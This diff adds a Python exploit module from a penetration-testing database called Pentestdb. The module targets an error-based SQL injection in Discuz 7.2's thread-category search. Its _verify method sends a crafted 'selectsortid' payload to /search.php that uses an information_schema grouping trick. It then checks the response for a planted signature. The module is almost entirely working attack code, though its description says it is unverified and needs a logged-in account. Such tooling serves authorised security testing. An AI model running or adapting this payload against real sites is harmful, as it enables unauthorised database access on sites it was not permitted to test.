@@ -1,0 +1,51 @@
+#!/usr/bin/env python
+#-*- coding:utf-8 -*-
+
+'''
+Pentestdb, a database for penetration test.
+Copyright (c) 2015 alpha1e0
+'''
+
+
+from script.libs.exploit import Exploit
+from script.libs.exploit import Result
+
+
+
+class DiscuzSI(Exploit):
+    expName = u"Discuz 7.2 主题分类 SQL注入"
+    version = "1.0"
+    author = "alpha1e0"
+    language = "php"
+    appName = "discuz"
+    appVersion = "7.x"
+    reference = ['http://www.wooyun.org/bugs/wooyun-2014-068707']
+    description = u'''
+        该exploit未验证通过
+        漏洞利用条件：1.Discuz 7.2，2.开启主题分类；2.登陆
+    '''
+
+    def _verify(self):
+        result = Result(self)
+
+        sig = '2c1743a391305fbf367df8e4f069f9f9'
+        payload = {
+            "formhash":"04949b0", 
+            "srchtxt":"aa", 
+            "srchtype":"threadsort", 
+            "st":"on",
+            "sortid":"3", 
+            "selectsortid": "3 where tid=(select 1 from (select count(*),concat({0},floor(rand(0)*2))x from information_schema.tables group by x)a)#".format(sig),
+            "searchsubmit":"true"
+        }
+
+        url = self.urlJoin("/search.php")
+        response = self.http.post(url, data=payload)
+        
+        if response.status_code==200:
+            if sig in response.content and "SQL" in response.content:
+                result['fullpath'] = response.request.body
+                result['payload'] = response.request.body
+
+        return result
+
